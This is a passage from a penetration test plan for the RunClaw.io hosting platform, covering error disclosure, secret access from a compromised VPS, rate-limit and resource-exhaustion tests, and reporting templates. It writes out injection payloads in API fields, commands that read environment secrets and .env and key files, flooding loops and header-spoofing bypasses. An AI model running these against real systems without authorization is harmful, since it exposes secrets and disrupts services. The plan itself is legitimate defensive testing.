**Severity if Found:** Server API key exposure: CVSS 9.8 (Critical). Stack trace with secrets: CVSS 7.5 (High).

---

### 8.2 Error Message Information Disclosure

**Objective:** Test whether error messages reveal internal system details, database structure, or file paths.

**Prerequisites:** curl, Burp Suite.

**Steps:**

1. Trigger various error conditions:
   ```bash
   # Invalid JSON
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Content-Type: application/json" \
     -d '{invalid'

   # Missing required fields
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{}'

   # SQL-like injection to trigger DB errors
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"'\''OR 1=1--","plan":"starter"}'

   # Very long input
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d "{\"subdomain\":\"$(python3 -c 'print("A"*10000)')\",\"plan\":\"starter\"}"

   # Null bytes
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"test\u0000admin","plan":"starter"}'
   ```

2. Check error responses for internal details:
   ```bash
   # Look for: file paths, stack traces, database queries, internal IPs,
   # library versions, Appwrite error codes with internal details
   ```

3. Test 404 and 500 error pages:
   ```bash
   curl -s "https://runclaw.io/nonexistent-page-12345"
   curl -s "https://runclaw.io/api/nonexistent-endpoint-12345"
   ```

**Expected Result (Secure):** Generic error messages ("An error occurred", "Invalid request"). No stack traces, file paths, or database details. Custom error pages for 404/500.

**Expected Result (Vulnerable):** Stack traces with file paths. Database query errors visible. Internal IP addresses leaked. Appwrite internal error details exposed.

**Evidence Collection:** Save all error responses.

**Severity if Found:** Stack trace exposure: CVSS 5.3 (Medium). Database structure leak: CVSS 6.5 (Medium).

---

### 8.3 Instance Data Access via Compromised VPS

**Objective:** Assess what data is accessible if a single customer VPS is compromised.

**Prerequisites:** SSH access to a test VPS.

**Steps:**

1. Enumerate accessible data from inside the OpenClaw container:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   # Check what volumes are mounted
   docker inspect openclaw-openclaw-1 | jq '.[0].Mounts'

   # List data in the OpenClaw data volume
   docker exec openclaw-openclaw-1 ls -la /app/data/

   # Check environment variables (may contain secrets)
   docker exec openclaw-openclaw-1 env

   # Check if callback_secret is in environment
   docker exec openclaw-openclaw-1 env | grep -i secret
   REMOTE
   ```

2. Check if the VPS has access to the Appwrite API key or other platform secrets:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   # Check cloud-init data (may contain secrets)
   cat /var/lib/cloud/instance/user-data.txt 2>/dev/null
   cat /var/lib/cloud/instance/scripts/runcmd 2>/dev/null

   # Check for leftover environment files
   find / -name ".env*" -readable 2>/dev/null
   find / -name "*.key" -readable 2>/dev/null
   REMOTE
   ```

3. Check if one VPS can access other VPS instances:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   # Try to reach other instances (should be isolated)
   nmap -sT -p 80,443,22 <OTHER_VPS_IP> 2>&1
   REMOTE
   ```

**Expected Result (Secure):** Container only has access to its own data volume. No platform API keys on the VPS. Cloud-init data cleaned up after provisioning. VPS instances cannot reach each other's internal services.

**Expected Result (Vulnerable):** Cloud-init script readable with callback_secret. Platform API keys accessible. Container has excessive mount points. VPS-to-VPS lateral movement possible.

**Evidence Collection:** Document all accessible data and secrets.

**Severity if Found:** Platform API key on VPS: CVSS 9.8 (Critical). Cloud-init secrets readable: CVSS 6.5 (Medium). Lateral movement: CVSS 8.1 (High).

---

## Phase 9: Denial of Service Testing

### 9.1 API Rate Limit Testing

**Objective:** Determine rate limits on all API endpoints and identify endpoints without rate limiting.

**Prerequisites:** curl, authorized test account.

**Steps:**

1. Test instance creation rate limit:
   ```bash
   for i in $(seq 1 50); do
     RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" \
       -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"ratelimit$i\",\"plan\":\"starter\"}")
     echo "Request $i: $RESP"
   done
   ```

2. Test instance list rate limit:
   ```bash
   for i in $(seq 1 100); do
     RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" \
       "https://runclaw.io/api/instances/list" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION")
     echo "Request $i: $RESP"
   done
   ```

3. Test unauthenticated endpoint rate limits:
   ```bash
   for i in $(seq 1 100); do
     RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" \
       -X POST "https://runclaw.io/api/instances/ready" \
       -H "Content-Type: application/json" \
       -d '{"instance_id":"fake","callback_secret":"fake"}')
     echo "Request $i: $RESP"
   done
   ```

4. Check for rate limit headers:
   ```bash
   curl -sI "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" | \
     grep -i "rate-limit\|x-ratelimit\|retry-after"
   ```

5. Test if rate limits are per-IP or per-user:
   ```bash
   # Use different User-Agent or X-Forwarded-For headers
   curl -s -o /dev/null -w "%{http_code}" \
     "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "X-Forwarded-For: 1.2.3.4"
   ```

**Expected Result (Secure):** Rate limiting returns HTTP 429 after threshold. Rate limit headers present. Instance creation limited to prevent cost amplification. Rate limits per-user AND per-IP. `X-Forwarded-For` spoofing does not bypass rate limits.

**Expected Result (Vulnerable):** No rate limiting on any endpoint. Can create unlimited instances. Can flood the ready callback endpoint. Rate limits bypassed via header spoofing.

**Evidence Collection:** Record response codes for each request. Note the threshold where rate limiting kicks in.

**Severity if Found:** No rate limit on instance creation: CVSS 7.5 (High). No rate limit on auth endpoints: CVSS 7.5 (High). Rate limit bypass: CVSS 6.5 (Medium).

---

### 9.2 Resource Exhaustion via Provisioning

**Objective:** Test whether an attacker can exhaust Hetzner API quotas or Cloudflare DNS limits.

**Prerequisites:** Test account, understanding of provider limits.

**Steps:**

1. Rapid instance creation (within authorized test limits):
   ```bash
   # Create instances as fast as possible (within RoE limits)
   for i in $(seq 1 10); do
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"exhaust$i\",\"plan\":\"starter\"}" &
   done
   wait
   ```

2. Check Hetzner rate limit response:
   ```bash
   # Hetzner has rate limits of ~3600 requests/hour
   # Check if the application handles rate limit responses gracefully
   ```

3. Verify cleanup - are all created resources cleaned up:
   ```bash
   # List instances
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" | jq '.instances | length'
   ```

**Expected Result (Secure):** Instance limits per user enforced. Hetzner API rate limit errors handled gracefully. Failed provisions cleaned up. Cost impact bounded.

**Expected Result (Vulnerable):** Unlimited resource creation. Hetzner rate limit errors not handled (orphaned resources). Cloudflare DNS record limit exhausted.

**Evidence Collection:** Document resource creation counts and cleanup status.

**Severity if Found:** Unbounded resource creation: CVSS 7.5 (High).

---

## Phase 10: Reporting Template

### 10.1 Executive Summary Template

```
PENETRATION TEST REPORT - EXECUTIVE SUMMARY
=============================================

Client:          RunClaw.io
Test Period:     [START_DATE] to [END_DATE]
Tester(s):       [NAMES]
Authorization:   [RoE DOCUMENT REFERENCE]

SCOPE
-----
- RunClaw.io web application (https://runclaw.io)
- API endpoints (/api/instances/*, /api/stripe/*, /api/cron/*)
- Customer VPS instances (*.runclaw.io)
- Supporting infrastructure (Appwrite, Cloudflare DNS, Hetzner)

OVERALL RISK RATING: [CRITICAL / HIGH / MEDIUM / LOW]

FINDINGS SUMMARY
----------------
| Severity | Count | Category |
|----------|-------|----------|
| Critical | X     | [categories] |
| High     | X     | [categories] |
| Medium   | X     | [categories] |
| Low      | X     | [categories] |
| Info     | X     | [categories] |

TOP FINDINGS
------------
1. [FINDING_TITLE] - [SEVERITY] - [CVSS SCORE]
   Brief description and business impact.

2. [FINDING_TITLE] - [SEVERITY] - [CVSS SCORE]
   Brief description and business impact.

3. [FINDING_TITLE] - [SEVERITY] - [CVSS SCORE]
   Brief description and business impact.

POSITIVE OBSERVATIONS
---------------------
- [Security control that was effective]
- [Security control that was effective]

STRATEGIC RECOMMENDATIONS
--------------------------
1. [IMMEDIATE] ...
2. [SHORT-TERM] ...
3. [LONG-TERM] ...
```

---

### 10.2 Individual Finding Template

```
FINDING: [UNIQUE-ID] - [TITLE]
================================

Severity:        [Critical / High / Medium / Low / Info]
CVSS 3.1 Score:  [X.X]
CVSS 3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
CWE:             [CWE-XXX: Description]
Status:          [Open / Remediated / Accepted Risk]

DESCRIPTION
-----------
[Detailed description of the vulnerability]

AFFECTED COMPONENT
------------------
[Endpoint, service, or infrastructure component]

PROOF OF CONCEPT
-----------------
[Step-by-step reproduction with exact commands]
[Include request/response pairs]
[Include screenshots where applicable]

BUSINESS IMPACT
---------------
[What could an attacker do with this vulnerability?]
[What is the potential financial, reputational, or data impact?]

REMEDIATION
-----------
[Specific technical fix recommended]
[Code example if applicable]

REFERENCES
----------
[Links to relevant CVEs, CWEs, OWASP references]
```

---

### 10.3 CVSS 3.1 Severity Classification

| Score Range | Rating | SLA for Remediation |
|-------------|--------|---------------------|
| 9.0 - 10.0 | Critical | Immediate (24-48 hours) |
| 7.0 - 8.9 | High | 7 days |
| 4.0 - 6.9 | Medium | 30 days |
| 0.1 - 3.9 | Low | 90 days |
| 0.0 | Informational | Next release cycle |

---

### 10.4 Proof of Concept Documentation Standards

Every finding must include:

1. **Exact reproduction steps** - numbered, with copy-paste commands
2. **Request/Response pairs** - full HTTP requests and responses (redact sensitive data from report, keep originals secured)
3. **Screenshots** - annotated screenshots showing the vulnerability
4. **Impact demonstration** - show actual impact (e.g., data accessed, action performed)
5. **Environment details** - tool versions, source IP, timestamps
6. **Limitations** - what was NOT tested and why

---

### 10.5 Re-test Verification Procedures

After remediation, perform targeted re-testing:

1. **Re-execute the exact PoC** from the finding report
2. **Verify the fix is comprehensive** - test variations of the original attack
3. **Regression test** - ensure the fix did not introduce new issues
4. **Document the re-test** with same evidence standards as original finding
5. **Update finding status** to "Remediated" with re-test date and results

Re-test report format:
```
RE-TEST REPORT
==============

Finding ID:      [UNIQUE-ID]
Original Date:   [DATE]
Re-test Date:    [DATE]
Remediation:     [Description of fix applied]
Re-test Result:  [PASS / FAIL / PARTIAL]
Evidence:        [Updated screenshots and request/response pairs]
Notes:           [Any remaining concerns or recommendations]
```

---

## Appendix A: Tool Installation

```bash
# Reconnaissance tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/owasp-amass/amass/v4/...@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/ffuf/ffuf/v2@latest

# Port scanning
# nmap - install via package manager
# masscan - install via package manager

# TLS testing
git clone https://github.com/drwetter/testssl.sh.git

# SSH auditing
pip install ssh-audit

# Web application testing
# Burp Suite - download from portswigger.net (Community or Pro)

# Docker security
docker pull docker/docker-bench-security

# Credential testing
# hydra - install via package manager

# Shodan
pip install shodan
```

---

## Appendix B: Test Account Setup Checklist

Before beginning penetration testing, ensure the following test accounts and resources are provisioned:

- [ ] Test Account A (with active Starter subscription)
- [ ] Test Account B (with active Starter subscription)
- [ ] Test Account C (no subscription)
- [ ] Test VPS instance for Account A
- [ ] Test VPS instance for Account B
- [ ] SSH access to at least one test VPS
- [ ] Burp Collaborator or interactsh listener configured
- [ ] Out-of-band callback server ready
- [ ] All tools from Appendix A installed and verified
- [ ] Rules of Engagement document signed
- [ ] Emergency contacts for the RunClaw.io team documented
- [ ] Testing window confirmed (dates and hours)

---

## Appendix C: Emergency Procedures

If during testing you discover:

1. **Active compromise or breach in progress** - Stop testing immediately. Contact the RunClaw.io security team via the emergency contact. Document everything observed.

2. **Critical vulnerability with active exploitation potential** - Stop testing the specific vector. Report immediately via secure channel. Do not attempt further exploitation.

3. **Unintended impact on production** - Stop the specific test. Notify the RunClaw.io team. Document the impact and assist with recovery if requested.

**Emergency Contact:** [TO BE FILLED BEFORE TESTING]
**Secure Reporting Channel:** [TO BE FILLED BEFORE TESTING]
